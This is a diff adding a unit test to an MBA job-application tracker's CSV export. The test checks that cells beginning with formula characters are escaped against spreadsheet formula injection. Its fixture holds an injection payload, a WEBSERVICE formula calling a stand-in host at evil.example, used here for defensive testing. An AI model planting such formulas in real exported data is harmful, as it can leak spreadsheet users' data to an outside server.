@@ -123,5 +123,27 @@ describe("mba applications storage helpers", () => {
     expect(csv).toContain("Status,Priority,Company");
     expect(csv).toContain('"Recruiter said, ""follow up"""');
   });
+
+  it("neutralizes spreadsheet formula injection in exported CSV", () => {
+    const base = createMBAApplicationFromJob(job);
+    const application = {
+      ...base,
+      notes: "@SUM(A1:A9)",
+      jobSnapshot: {
+        ...base.jobSnapshot,
+        location: '=WEBSERVICE("https://evil.example/x")',
+      },
+    };
+
+    const csv = buildMBAApplicationsCsv([application]);
+
+    // A leading formula character (= + - @, or tab/CR) is prefixed with a
+    // single quote so Excel/Sheets treats the cell as text, not a formula.
+    expect(csv).toContain("'=WEBSERVICE");
+    expect(csv).toContain("'@SUM(A1:A9)");
+    // The raw formula must never sit at a cell boundary where it would evaluate.
+    expect(csv).not.toMatch(/,=WEBSERVICE/);
+    expect(csv).not.toMatch(/,@SUM/);
+  });
 });
 
